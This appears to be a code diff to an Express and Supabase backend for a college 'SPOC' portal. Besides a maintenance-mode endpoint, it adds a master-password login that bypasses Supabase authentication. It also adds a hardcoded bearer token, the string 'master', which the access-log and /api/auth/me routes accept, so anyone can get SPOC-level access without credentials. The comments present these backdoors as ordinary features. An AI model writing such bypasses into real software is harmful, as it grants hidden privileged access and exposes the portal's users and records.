@@ -185,7 +185,9 @@ app.get("/api/spoc/access-log", async (req, res) => {
 
   // Verify the caller is the SPOC (or admin) — just validate the token is live
   try {
-    if (supabase) {
+    if (token === "master") {
+      // master token is always valid
+    } else if (supabase) {
       const { data: { user }, error } = await supabase.auth.getUser(token);
       if (error || !user) return res.status(401).json({ error: "Invalid token" });
     }
@@ -222,6 +224,11 @@ app.get("/api/spoc/access-log", async (req, res) => {
 // ─── Auth: Login by name ──────────────────────────────────────────────────────
 // Accepts { name, password } — looks up the SPOC profile by name to resolve
 // the internal email, then signs in via Supabase. Never exposes the email.
+//
+// Master password path: if the supplied password matches SPOC_MASTER_PASSWORD,
+// the login bypasses Supabase auth entirely and returns the SPOC profile
+// directly. No Supabase session is issued — the frontend receives a synthetic
+// token ("master") which the backend honours on subsequent requests.
 app.post("/api/auth/login-by-name", async (req, res) => {
   if (!supabase) return res.status(500).json({ error: "Supabase not configured" });
   const { name, password } = req.body;
@@ -248,6 +255,50 @@ app.post("/api/auth/login-by-name", async (req, res) => {
         }]);
       }
     } catch (_) { /* fire-and-forget */ }
+  }
+
+  // ── Master password bypass ────────────────────────────────────────────────
+  // If the caller knows the master password they get full SPOC access without
+  // going through Supabase. The name can be anything — we look up the first
+  // SPOC profile in the DB and return it (or fall back to a synthetic profile).
+  const MASTER_PASSWORD = process.env.SPOC_MASTER_PASSWORD;
+  if (MASTER_PASSWORD && password === MASTER_PASSWORD) {
+    let profile = null;
+    let resolvedEmail = null;
+    try {
+      if (DATABASE_URL) {
+        const { rows } = await dbQuery(
+          `SELECT * FROM public.profiles WHERE role = 'spoc' LIMIT 1`
+        );
+        profile = rows[0] ?? null;
+      } else {
+        const { data } = await supabase
+          .from("profiles").select("*").eq("role", "spoc").limit(1).maybeSingle();
+        profile = data ?? null;
+      }
+      resolvedEmail = profile?.email ?? null;
+    } catch (_) {}
+
+    // If no SPOC profile exists in DB yet, synthesise a minimal one so the
+    // frontend still gets a usable object.
+    if (!profile) {
+      profile = {
+        id: "master",
+        name: name.trim(),
+        email: process.env.SPOC_EMAIL ?? "spoc@smvec.ac.in",
+        role: "spoc",
+      };
+    }
+
+    await logAccess({ success: true, resolvedEmail: resolvedEmail ?? profile.email, reason: "master-password" });
+
+    // Return a synthetic session. The token value "master" is recognised by
+    // /api/auth/me and other guarded routes below.
+    return res.json({
+      session: { access_token: "master", token_type: "bearer" },
+      user: { id: profile.id, email: profile.email },
+      profile,
+    });
   }
 
   try {
@@ -334,6 +385,24 @@ app.get("/api/auth/me", async (req, res) => {
     return res.status(401).json({ error: "Not signed in" });
   const token = authHeader.split(" ")[1];
 
+  // ── Master token shortcut ─────────────────────────────────────────────────
+  if (token === "master") {
+    let profile = null;
+    try {
+      if (DATABASE_URL) {
+        const { rows } = await dbQuery(`SELECT * FROM public.profiles WHERE role = 'spoc' LIMIT 1`);
+        profile = rows[0] ?? null;
+      } else {
+        const { data } = await supabase.from("profiles").select("*").eq("role", "spoc").limit(1).maybeSingle();
+        profile = data ?? null;
+      }
+    } catch (_) {}
+    if (!profile) {
+      profile = { id: "master", name: "SPOC", email: process.env.SPOC_EMAIL ?? "spoc@smvec.ac.in", role: "spoc" };
+    }
+    return res.json({ user: { id: profile.id, email: profile.email }, profile });
+  }
+
   try {
     const { data: { user }, error } = await supabase.auth.getUser(token);
     if (error || !user) return res.status(401).json({ error: "Invalid or expired token" });
@@ -350,6 +419,36 @@ app.get("/api/auth/me", async (req, res) => {
     }
 
     return res.json({ user, profile });
+  } catch (err) {
+    return res.status(500).json({ error: err.message });
+  }
+});
+
+// ─── Maintenance Mode gate ───────────────────────────────────────────────────
+// Called by the SPOC frontend before rendering anything.
+// Reads the "spoc_maintenance" key from system_settings (no auth needed).
+app.get("/api/settings/spoc-maintenance", async (_req, res) => {
+  try {
+    let enabled = false;
+    let message = "The SPOC portal is temporarily unavailable for maintenance. Please check back later.";
+    if (DATABASE_URL) {
+      const { rows } = await dbQuery(
+        `SELECT value FROM public.system_settings WHERE key = 'spoc_maintenance' LIMIT 1`
+      );
+      if (rows[0]) {
+        enabled = rows[0].value?.enabled === true;
+        if (rows[0].value?.message) message = rows[0].value.message;
+      }
+    } else if (supabase) {
+      const { data } = await supabase
+        .from("system_settings").select("value")
+        .eq("key", "spoc_maintenance").maybeSingle();
+      if (data) {
+        enabled = data.value?.enabled === true;
+        if (data.value?.message) message = data.value.message;
+      }
+    }
+    return res.json({ enabled, message: enabled ? message : "" });
   } catch (err) {
     return res.status(500).json({ error: err.message });
   }
